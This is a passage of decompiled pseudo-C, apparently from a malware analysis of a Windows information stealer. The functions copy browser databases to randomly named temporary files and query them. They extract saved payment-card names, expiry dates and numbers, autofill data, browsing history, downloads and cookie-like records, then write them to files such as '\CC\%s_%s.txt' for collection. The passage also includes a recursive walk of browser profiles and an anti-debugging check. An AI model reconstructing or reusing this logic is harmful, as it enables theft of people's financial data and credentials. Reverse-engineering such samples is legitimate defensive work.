          FUN_003aee4b(local_240);
        }
        local_22c = 0xf;
        local_230 = 0;
        local_240 = (void *)((uint)local_240 & 0xffffff00);
        (*_DAT_003d9520)(local_244,&DAT_003ce668);
        iVar1 = (*_DAT_003d9314)(local_248);
        uVar12 = (undefined)unaff_ESI;
      }
      iVar1 = (*_DAT_003d9418)(local_244);
      if (param_6 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*param_6 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)param_6[1],local_244,local_11c,iVar1,3);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      trim_string((undefined (*) [16])&local_244,0,4);
    }
    (*_DAT_003d9318)(local_248);
    (*_DAT_003d9348)(local_250);
  }
  (*_DAT_003d9424)(local_224);
  uVar5 = extraout_EDX;
LAB_0039aa64:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar5,uVar12);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_0039aa90(undefined4 param_1,int param_2,undefined4 param_3,undefined4 param_4,int param_5,
            int *param_6)

{
  uint uVar1;
  undefined *puVar2;
  ulong uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  void *pvVar7;
  undefined4 *puVar8;
  undefined4 extraout_EDX;
  int iVar9;
  int **in_FS_OFFSET;
  int iVar10;
  undefined uVar11;
  undefined *puVar12;
  undefined4 local_24c;
  undefined4 local_248;
  int local_244;
  void *local_240;
  undefined4 local_230;
  uint local_22c;
  undefined local_224 [264];
  undefined local_11c [264];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c42cb;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = uVar1;
  trim_string((undefined (*) [16])local_11c,0,0x104);
  (*_DAT_003d9520)(local_11c,DAT_003d9098,uVar1);
  puVar2 = (undefined *)_malloc(0x1a);
  *puVar2 = 0;
  uVar3 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar3);
  iVar9 = 0x1a;
  do {
    uVar1 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar2,&DAT_003d1ad4,puVar2,(int)uVar1 % 10);
    iVar9 = iVar9 + -1;
  } while (iVar9 != 0);
  puVar12 = local_11c;
  puVar2[0x1a] = 0;
  (*_DAT_003d9520)(puVar12,puVar2);
  (*_DAT_003d93c8)(param_3,local_11c,1);
  trim_string((undefined (*) [16])local_224,0,0x104);
  (*_DAT_003d9374)(local_224,"\\CC\\%s_%s.txt",param_1,param_4);
  uVar4 = DAT_003d8c30;
  iVar9 = (*_DAT_003d9344)(local_11c,&local_24c);
  uVar11 = SUB41(puVar12,0);
  if (iVar9 == 0) {
    iVar9 = (*_DAT_003d92f8)(local_24c,uVar4,0xffffffff,&local_248,0);
    uVar11 = SUB41(puVar12,0);
    if (iVar9 == 0) {
      uVar4 = (*_DAT_003d957c)(0,999999);
      local_244 = (*_DAT_003d9504)(uVar4);
      iVar9 = (*_DAT_003d9314)(local_248);
      while (uVar11 = SUB41(puVar12,0), iVar9 == 100) {
        uVar4 = (*_DAT_003d9334)(local_248,0);
        uVar5 = (*_DAT_003d9334)(local_248,1);
        uVar6 = (*_DAT_003d9334)(local_248,2);
        (*_DAT_003d9520)(local_244,"Name: ");
        (*_DAT_003d9520)(local_244,uVar4);
        (*_DAT_003d9520)(local_244,&DAT_003ce668);
        (*_DAT_003d9520)(local_244,"Month: ");
        (*_DAT_003d9520)(local_244,uVar5);
        (*_DAT_003d9520)(local_244,&DAT_003ce668);
        (*_DAT_003d9520)(local_244,"Year: ");
        (*_DAT_003d9520)(local_244,uVar6);
        (*_DAT_003d9520)(local_244,&DAT_003ce668);
        (*_DAT_003d9520)(local_244,"Card: ");
        iVar9 = param_2;
        iVar10 = param_5;
        uVar1 = (*_DAT_003d9320)(local_248,3);
        pvVar7 = (void *)(*_DAT_003d9328)(local_248,3);
        puVar8 = (undefined4 *)FUN_00399f60(pvVar7,uVar1,iVar9,iVar10);
        local_8 = 0;
        if (0xf < (uint)puVar8[5]) {
          puVar8 = (undefined4 *)*puVar8;
        }
        (*_DAT_003d9520)(local_244,puVar8);
        local_8 = 0xffffffff;
        if (0xf < local_22c) {
          FUN_003aee4b(local_240);
        }
        local_22c = 0xf;
        local_230 = 0;
        local_240 = (void *)((uint)local_240 & 0xffffff00);
        (*_DAT_003d9520)(local_244,&DAT_003d0c34);
        iVar9 = (*_DAT_003d9314)(local_248);
      }
      iVar9 = (*_DAT_003d9418)(local_244);
      if (param_6 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*param_6 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)param_6[1],local_244,local_224,iVar9,3);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      trim_string((undefined (*) [16])&local_244,0,4);
    }
    (*_DAT_003d9318)(local_248);
    (*_DAT_003d9348)(local_24c);
  }
  (*_DAT_003d9424)(local_11c);
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar11);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039ae80(undefined4 param_1,int *param_2,int param_3)

{
  undefined *puVar1;
  ulong uVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 extraout_EDX;
  int iVar5;
  undefined uVar6;
  undefined4 local_228;
  undefined4 local_224;
  int local_220;
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_220 = param_3;
  trim_string((undefined (*) [16])local_114,0,0x104);
  (*_DAT_003d9520)(local_114,DAT_003d9098);
  puVar1 = (undefined *)_malloc(0x1a);
  *puVar1 = 0;
  uVar2 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar2);
  iVar5 = 0x1a;
  do {
    uVar3 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar1,&DAT_003d1ad4,puVar1,(int)uVar3 % 10);
    iVar5 = iVar5 + -1;
  } while (iVar5 != 0);
  puVar1[0x1a] = 0;
  (*_DAT_003d9520)(local_114,puVar1);
  puVar1 = local_114;
  (*_DAT_003d93c8)();
  trim_string((undefined (*) [16])local_21c,0,0x104);
  (*_DAT_003d9374)(local_21c,"\\Autofill\\%s_%s.txt",param_1,local_220);
  uVar4 = DAT_003d91c4;
  iVar5 = (*_DAT_003d9344)(local_114,&local_228);
  uVar6 = SUB41(puVar1,0);
  if (iVar5 == 0) {
    iVar5 = (*_DAT_003d92f8)(local_228,uVar4,0xffffffff,&local_224,0);
    uVar6 = SUB41(puVar1,0);
    if (iVar5 == 0) {
      uVar4 = (*_DAT_003d957c)(0,999999);
      local_220 = (*_DAT_003d9504)(uVar4);
      iVar5 = (*_DAT_003d9314)(local_224);
      while (uVar6 = SUB41(puVar1,0), iVar5 == 100) {
        uVar4 = (*_DAT_003d9334)(local_224,0);
        (*_DAT_003d9520)(local_220,uVar4);
        (*_DAT_003d9520)(local_220,&DAT_003d108c);
        uVar4 = (*_DAT_003d9334)(local_224,1);
        (*_DAT_003d9520)(local_220,uVar4);
        (*_DAT_003d9520)(local_220,&DAT_003ce668);
        iVar5 = (*_DAT_003d9314)(local_224);
      }
      iVar5 = (*_DAT_003d9418)(local_220);
      if (param_2 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*param_2 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)param_2[1],local_220,local_21c,iVar5,3);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      trim_string((undefined (*) [16])&local_220,0,4);
    }
    (*_DAT_003d9318)(local_224);
    (*_DAT_003d9348)(local_228);
  }
  (*_DAT_003d9424)(local_114);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar6);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039b110(undefined4 param_1,int *param_2,int param_3)

{
  undefined *puVar1;
  ulong uVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 extraout_EDX;
  int iVar5;
  undefined uVar6;
  undefined4 local_228;
  undefined4 local_224;
  int local_220;
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_220 = param_3;
  trim_string((undefined (*) [16])local_114,0,0x104);
  (*_DAT_003d9520)(local_114,DAT_003d9098);
  puVar1 = (undefined *)_malloc(0x1a);
  *puVar1 = 0;
  uVar2 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar2);
  iVar5 = 0x1a;
  do {
    uVar3 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar1,&DAT_003d1ad4,puVar1,(int)uVar3 % 10);
    iVar5 = iVar5 + -1;
  } while (iVar5 != 0);
  puVar1[0x1a] = 0;
  (*_DAT_003d9520)(local_114,puVar1);
  puVar1 = local_114;
  (*_DAT_003d93c8)();
  trim_string((undefined (*) [16])local_21c,0,0x104);
  (*_DAT_003d9374)(local_21c,"\\History\\%s_%s.txt",param_1,local_220);
  iVar5 = (*_DAT_003d9344)(local_114,&local_228);
  uVar6 = SUB41(puVar1,0);
  if (iVar5 == 0) {
    iVar5 = (*_DAT_003d92f8)(local_228,DAT_003d8ec0,0xffffffff,&local_224,0);
    uVar6 = SUB41(puVar1,0);
    if (iVar5 == 0) {
      uVar4 = (*_DAT_003d957c)(0,999999);
      local_220 = (*_DAT_003d9504)(uVar4);
      iVar5 = (*_DAT_003d9314)(local_224);
      while (uVar6 = SUB41(puVar1,0), iVar5 == 100) {
        (*_DAT_003d9334)(local_224,0);
        uVar4 = (*_DAT_003d9334)(local_224,0);
        (*_DAT_003d9520)(local_220,uVar4);
        (*_DAT_003d9520)(local_220,&DAT_003ce668);
        iVar5 = (*_DAT_003d9314)(local_224);
      }
      iVar5 = (*_DAT_003d9418)(local_220);
      if (param_2 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*param_2 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)param_2[1],local_220,local_21c,iVar5,3);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      trim_string((undefined (*) [16])&local_220,0,4);
    }
    (*_DAT_003d9318)(local_224);
    (*_DAT_003d9348)(local_228);
  }
  (*_DAT_003d9424)(local_114);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar6);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039b370(undefined4 param_1,int *param_2,int param_3)

{
  undefined *puVar1;
  ulong uVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 extraout_EDX;
  int iVar6;
  undefined uVar7;
  undefined4 local_228;
  undefined4 local_224;
  int local_220;
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_220 = param_3;
  trim_string((undefined (*) [16])local_114,0,0x104);
  (*_DAT_003d9520)(local_114,DAT_003d9098);
  puVar1 = (undefined *)_malloc(0x1a);
  *puVar1 = 0;
  uVar2 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar2);
  iVar6 = 0x1a;
  do {
    uVar3 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar1,&DAT_003d1ad4,puVar1,(int)uVar3 % 10);
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  puVar1[0x1a] = 0;
  (*_DAT_003d9520)(local_114,puVar1);
  puVar1 = local_114;
  (*_DAT_003d93c8)();
  trim_string((undefined (*) [16])local_21c,0,0x104);
  (*_DAT_003d9374)(local_21c,"\\Downloads\\%s_%s.txt",param_1,local_220);
  uVar4 = DAT_003d9280;
  iVar6 = (*_DAT_003d9344)(local_114,&local_228);
  uVar7 = SUB41(puVar1,0);
  if (iVar6 == 0) {
    iVar6 = (*_DAT_003d92f8)(local_228,uVar4,0xffffffff,&local_224,0);
    uVar7 = SUB41(puVar1,0);
    if (iVar6 == 0) {
      uVar4 = (*_DAT_003d957c)(0,999999);
      local_220 = (*_DAT_003d9504)(uVar4);
      iVar6 = (*_DAT_003d9314)(local_224);
      while (uVar7 = SUB41(puVar1,0), iVar6 == 100) {
        uVar4 = (*_DAT_003d9334)(local_224,0);
        uVar5 = (*_DAT_003d9334)(local_224,1);
        (*_DAT_003d9520)(local_220,uVar4);
        (*_DAT_003d9520)(local_220,&DAT_003ce668);
        (*_DAT_003d9520)(local_220,uVar5);
        (*_DAT_003d9520)(local_220,&DAT_003d0c34);
        iVar6 = (*_DAT_003d9314)(local_224);
      }
      iVar6 = (*_DAT_003d9418)(local_220);
      if (param_2 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*param_2 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)param_2[1],local_220,local_21c,iVar6,3);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      trim_string((undefined (*) [16])&local_220,0,4);
    }
    (*_DAT_003d9318)(local_224);
    (*_DAT_003d9348)(local_228);
  }
  (*_DAT_003d9424)(local_114);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar7);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_0039b600(void *this,undefined4 param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 extraout_EDX;
  undefined8 uVar5;
  undefined in_stack_fffffee4;
  undefined local_10c [260];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar5 = FUN_003b1703(&DAT_003d9300);
  uVar3 = (undefined4)((ulonglong)uVar5 >> 0x20);
  if ((int)uVar5 < 0x20) {
    trim_string((undefined (*) [16])local_10c,0,0x104);
    (*_DAT_003d9520)(local_10c,this);
    (*_DAT_003d9520)(local_10c,&DAT_003ce7fc);
    (*_DAT_003d9520)(local_10c,DAT_003d92d0);
    iVar1 = (*_DAT_003d93b4)(local_10c,0x80000000,1,0,3,0,0);
    if (iVar1 != 0) {
      (*_DAT_003d93d0)(iVar1,0,0,2);
      iVar2 = (*_DAT_003d9590)(iVar1,0);
      (*_DAT_003d93d0)(iVar1,0,0,0);
      uVar3 = FUN_003ae40b(iVar2 + 1);
      (*_DAT_003d94dc)(iVar1,uVar3,iVar2,&stack0xfffffee4,0);
      iVar2 = (*_DAT_003d93a0)(uVar3,DAT_003d8bb4);
      while (iVar2 != 0) {
        iVar4 = (*_DAT_003d9418)(DAT_003d8bb4);
        iVar2 = (*_DAT_003d93a0)(iVar2 + 3 + iVar4,DAT_003d8e28);
        *(undefined *)(iVar2 + -3) = 0;
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        iVar4 = (*_DAT_003d93a0)(iVar2 + -2,DAT_003d9074);
        iVar2 = (*_DAT_003d9418)(DAT_003d9074);
        iVar2 = iVar4 + 3 + iVar2;
        iVar4 = (*_DAT_003d93a0)(iVar2,DAT_003d9070);
        *(undefined *)(iVar4 + -3) = 0;
        (*_DAT_003d9520)();
        FUN_003999d0(iVar2);
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        iVar4 = (*_DAT_003d93a0)(iVar4 + -2,DAT_003d9070);
        iVar2 = (*_DAT_003d9418)(DAT_003d9070);
        iVar2 = iVar4 + 3 + iVar2;
        iVar4 = (*_DAT_003d93a0)(iVar2,DAT_003d91f4);
        *(undefined *)(iVar4 + -3) = 0;
        (*_DAT_003d9520)();
        FUN_003999d0(iVar2);
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        iVar2 = (*_DAT_003d93a0)(iVar4 + -2,DAT_003d8bb4);
      }
      (*_DAT_003d93b8)(iVar1);
    }
    (*_DAT_003d934c)();
    uVar3 = extraout_EDX;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar3,in_stack_fffffee4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039b890(int param_1,int *param_2,undefined4 param_3,undefined4 param_4)

{
  undefined *puVar1;
  ulong uVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined (*lorem_ipsum) [16];
  undefined (*lorem_ipsum_00) [16];
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 extraout_EDX;
  int iVar8;
  char *pcVar9;
  undefined uVar10;
  undefined4 local_22c;
  undefined4 local_228;
  undefined4 local_224;
  int local_220;
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_228 = param_4;
  local_220 = param_1;
  trim_string((undefined (*) [16])local_21c,0,0x104);
  (*_DAT_003d9520)(local_21c,DAT_003d9098);
  puVar1 = (undefined *)_malloc(0x1a);
  *puVar1 = 0;
  uVar2 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar2);
  iVar8 = 0x1a;
  do {
    uVar3 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar1,&DAT_003d1ad4,puVar1,(int)uVar3 % 10);
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  puVar1[0x1a] = 0;
  (*_DAT_003d9520)(local_21c,puVar1);
  (*_DAT_003d93c8)(param_3,local_21c,1);
  trim_string((undefined (*) [16])local_114,0,0x104);
  (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
  (*_DAT_003d9520)(local_114,DAT_003d9104);
  (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
  (*_DAT_003d9520)(local_114,local_220);
  (*_DAT_003d9520)(local_114,&DAT_003d103c);
  puVar1 = local_114;
  (*_DAT_003d9520)(puVar1,local_228);
  (*_DAT_003d9520)(local_114,&DAT_003ce80c);
  uVar4 = DAT_003d8c24;
  iVar8 = (*_DAT_003d9344)(local_21c,&local_22c);
  uVar10 = SUB41(puVar1,0);
  if (iVar8 == 0) {
    iVar8 = (*_DAT_003d92f8)(local_22c,uVar4,0xffffffff,&local_224,0);
    uVar10 = SUB41(puVar1,0);
    if (iVar8 == 0) {
      uVar4 = (*_DAT_003d957c)(0,999999);
      local_220 = (*_DAT_003d9504)(uVar4);
      iVar8 = (*_DAT_003d9314)(local_224);
      while (uVar10 = SUB41(puVar1,0), iVar8 == 100) {
        uVar4 = (*_DAT_003d9334)(local_224,0);
        lorem_ipsum = (undefined (*) [16])(*_DAT_003d9334)(local_224,1);
        local_228 = (*_DAT_003d9334)(local_224,2);
        lorem_ipsum_00 = (undefined (*) [16])(*_DAT_003d9334)(local_224,3);
        uVar5 = (*_DAT_003d9334)(local_224,4);
        uVar6 = (*_DAT_003d9334)(local_224,5);
        uVar7 = (*_DAT_003d9334)(local_224,6);
        iVar8 = (*_DAT_003d9550)(lorem_ipsum,&DAT_003d1040);
        if (iVar8 == 0) {
          trim_string(lorem_ipsum,0,4);
          pcVar9 = "TRUE";
        }
        else {
          trim_string(lorem_ipsum,0,4);
          pcVar9 = "FALSE";
        }
        (*_DAT_003d9520)(lorem_ipsum,pcVar9);
        iVar8 = (*_DAT_003d9550)(lorem_ipsum_00,&DAT_003d1040);
        if (iVar8 == 0) {
          trim_string(lorem_ipsum_00,0,4);
          pcVar9 = "TRUE";
        }
        else {
          trim_string(lorem_ipsum_00,0,4);
          pcVar9 = "FALSE";
        }
        (*_DAT_003d9520)(lorem_ipsum_00,pcVar9);
        (*_DAT_003d9520)(local_220,uVar4);
        (*_DAT_003d9520)(local_220,&DAT_003d1044);
        (*_DAT_003d9520)(local_220,lorem_ipsum);
        (*_DAT_003d9520)(local_220,&DAT_003d1044);
        (*_DAT_003d9520)(local_220,local_228);
        (*_DAT_003d9520)(local_220,&DAT_003d1044);
        (*_DAT_003d9520)(local_220,lorem_ipsum_00);
        (*_DAT_003d9520)(local_220,&DAT_003d1044);
        (*_DAT_003d9520)(local_220,uVar5);
        (*_DAT_003d9520)(local_220,&DAT_003d1044);
        (*_DAT_003d9520)(local_220,uVar6);
        (*_DAT_003d9520)(local_220,&DAT_003d1044);
        (*_DAT_003d9520)(local_220,uVar7);
        (*_DAT_003d9520)(local_220,&DAT_003ce668);
        iVar8 = (*_DAT_003d9314)(local_224);
      }
      iVar8 = (*_DAT_003d9418)(local_220);
      if (param_2 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*param_2 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)param_2[1],local_220,local_114,iVar8,3);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      trim_string((undefined (*) [16])&local_220,0,4);
    }
    (*_DAT_003d9318)(local_224);
    (*_DAT_003d9348)(local_22c);
  }
  (*_DAT_003d9424)(local_21c);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar10);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039bd20(undefined4 param_1,int *param_2,int param_3)

{
  undefined *puVar1;
  ulong uVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 extraout_EDX;
  int iVar5;
  undefined uVar6;
  undefined4 local_228;
  undefined4 local_224;
  int local_220;
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_220 = param_3;
  trim_string((undefined (*) [16])local_114,0,0x104);
  (*_DAT_003d9520)(local_114,DAT_003d9098);
  puVar1 = (undefined *)_malloc(0x1a);
  *puVar1 = 0;
  uVar2 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar2);
  iVar5 = 0x1a;
  do {
    uVar3 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar1,&DAT_003d1ad4,puVar1,(int)uVar3 % 10);
    iVar5 = iVar5 + -1;
  } while (iVar5 != 0);
  puVar1[0x1a] = 0;
  (*_DAT_003d9520)(local_114,puVar1);
  puVar1 = local_114;
  (*_DAT_003d93c8)();
  trim_string((undefined (*) [16])local_21c,0,0x104);
  (*_DAT_003d9374)(local_21c,"\\History\\%s_%s.txt",param_1,local_220);
  uVar4 = DAT_003d8cf0;
  iVar5 = (*_DAT_003d9344)(local_114,&local_228);
  uVar6 = SUB41(puVar1,0);
  if (iVar5 == 0) {
    iVar5 = (*_DAT_003d92f8)(local_228,uVar4,0xffffffff,&local_224,0);
    uVar6 = SUB41(puVar1,0);
    if (iVar5 == 0) {
      uVar4 = (*_DAT_003d957c)(0,999999);
      local_220 = (*_DAT_003d9504)(uVar4);
      iVar5 = (*_DAT_003d9314)(local_224);
      while (uVar6 = SUB41(puVar1,0), iVar5 == 100) {
        uVar4 = (*_DAT_003d9334)(local_224,0);
        (*_DAT_003d9520)(local_220,uVar4);
        (*_DAT_003d9520)(local_220,&DAT_003ce668);
        iVar5 = (*_DAT_003d9314)(local_224);
      }
      iVar5 = (*_DAT_003d9418)(local_220);
      if (param_2 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*param_2 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)param_2[1],local_220,local_21c,iVar5,3);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      trim_string((undefined (*) [16])&local_220,0,4);
    }
    (*_DAT_003d9318)(local_224);
    (*_DAT_003d9348)(local_228);
  }
  (*_DAT_003d9424)(local_114);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar6);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039bf80(undefined4 param_1,int *param_2,int param_3)

{
  undefined *puVar1;
  ulong uVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 extraout_EDX;
  int iVar6;
  undefined uVar7;
  undefined4 local_228;
  undefined4 local_224;
  int local_220;
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_220 = param_3;
  trim_string((undefined (*) [16])local_114,0,0x104);
  (*_DAT_003d9520)(local_114,DAT_003d9098);
  puVar1 = (undefined *)_malloc(0x1a);
  *puVar1 = 0;
  uVar2 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar2);
  iVar6 = 0x1a;
  do {
    uVar3 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar1,&DAT_003d1ad4,puVar1,(int)uVar3 % 10);
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  puVar1[0x1a] = 0;
  (*_DAT_003d9520)(local_114,puVar1);
  puVar1 = local_114;
  (*_DAT_003d93c8)();
  trim_string((undefined (*) [16])local_21c,0,0x104);
  (*_DAT_003d9374)(local_21c,"\\Autofill\\%s_%s.txt",param_1,local_220);
  uVar4 = DAT_003d8aa8;
  iVar6 = (*_DAT_003d9344)(local_114,&local_228);
  uVar7 = SUB41(puVar1,0);
  if (iVar6 == 0) {
    iVar6 = (*_DAT_003d92f8)(local_228,uVar4,0xffffffff,&local_224,0);
    uVar7 = SUB41(puVar1,0);
    if (iVar6 == 0) {
      uVar4 = (*_DAT_003d957c)(0,999999);
      local_220 = (*_DAT_003d9504)(uVar4);
      iVar6 = (*_DAT_003d9314)(local_224);
      while (uVar7 = SUB41(puVar1,0), iVar6 == 100) {
        uVar4 = (*_DAT_003d9334)(local_224,0);
        uVar5 = (*_DAT_003d9334)(local_224,1);
        (*_DAT_003d9520)(local_220,uVar4);
        (*_DAT_003d9520)(local_220,&DAT_003d1044);
        (*_DAT_003d9520)(local_220,uVar5);
        (*_DAT_003d9520)(local_220,&DAT_003ce668);
        iVar6 = (*_DAT_003d9314)(local_224);
      }
      iVar6 = (*_DAT_003d9418)(local_220);
      if (param_2 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*param_2 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)param_2[1],local_220,local_21c,iVar6,3);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      trim_string((undefined (*) [16])&local_220,0,4);
    }
    (*_DAT_003d9318)(local_224);
    (*_DAT_003d9348)(local_228);
  }
  (*_DAT_003d9424)(local_114);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar7);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall
FUN_0039c200(void *this,undefined1 *param_1,undefined4 param_2,undefined4 param_3,int param_4,
            int param_5,int *param_6,undefined4 param_7,int param_8)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  undefined4 extraout_EDX;
  undefined4 uVar5;
  undefined4 unaff_ESI;
  undefined8 uVar6;
  undefined uVar7;
  byte local_56c [44];
  undefined local_540 [276];
  undefined local_42c [264];
  undefined local_324 [264];
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  (*_DAT_003d9374)(local_42c,&DAT_003d0aa8,param_2);
  uVar6 = (*_DAT_003d95e0)(local_42c,local_56c);
  uVar5 = (undefined4)((ulonglong)uVar6 >> 0x20);
  iVar2 = (int)uVar6;
  uVar7 = (undefined)unaff_ESI;
  bVar1 = false;
  if (iVar2 != -1) {
    do {
      iVar3 = (*_DAT_003d9550)(local_540,&DAT_003d0ab0);
      if ((iVar3 != 0) && (iVar3 = (*_DAT_003d9550)(local_540,&DAT_003d0ab4), iVar3 != 0)) {
        (*_DAT_003d9374)(local_114,"%s\\%s",param_2,local_540);
        trim_string((undefined (*) [16])local_21c,0,0x104);
        (*_DAT_003d9374)(local_21c,"%s\\%s\\%s\\%s",param_2,local_540,DAT_003d9110,DAT_003d8a8c);
        trim_string((undefined (*) [16])local_324,0,0x104);
        (*_DAT_003d9374)(local_324,"%s\\%s\\%s",param_2,DAT_003d9110,DAT_003d8a8c);
        iVar3 = (*_DAT_003d9550)(local_540,DAT_003d8d28);
        if (iVar3 == 0) {
          FUN_0039a0f0(param_1,param_4,param_5);
          if ((param_8 != 0) && (!bVar1)) {
            FUN_0039a4f0(param_4,param_5,local_324,&DAT_003ce656,param_3,param_6);
            bVar1 = true;
          }
          FUN_0039c200(this,local_540,local_114,param_3,param_4,param_5,param_6,param_7,param_8);
        }
        else {
          iVar3 = (*_DAT_003d9550)(local_540,DAT_003d8a8c);
          if (iVar3 == 0) {
            FUN_0039a4f0(param_4,param_5,local_114,param_1,param_3,param_6);
          }
          else {
            uVar4 = (*_DAT_003d9470)(local_21c);
            if ((uVar4 == 0xffffffff) || ((uVar4 & 0x10) != 0)) {
              iVar3 = (*_DAT_003d9550)(local_540,DAT_003d8dcc);
              if (iVar3 == 0) {
                if (*(char *)((int)this + 2) != '\0') {
                  FUN_0039b110(param_3,param_6,(int)param_1);
                  FUN_0039b370(param_3,param_6,(int)param_1);
                }
              }
              else {
                iVar3 = (*_DAT_003d9550)(local_540,DAT_003d8b24);
                if (iVar3 == 0) {
                  if (*(char *)((int)this + 1) != '\0') {
                    FUN_0039aa90(param_3,param_4,local_114,param_1,param_5,param_6);
                    FUN_0039ae80(param_3,param_6,(int)param_1);
                  }
                }
                else {
                  if ((local_56c[0] & 0x10) == 0) goto LAB_0039c5c5;
                }
              }
            }
            else {
              FUN_0039a4f0(param_4,param_5,local_21c,local_540,param_3,param_6);
            }
          }
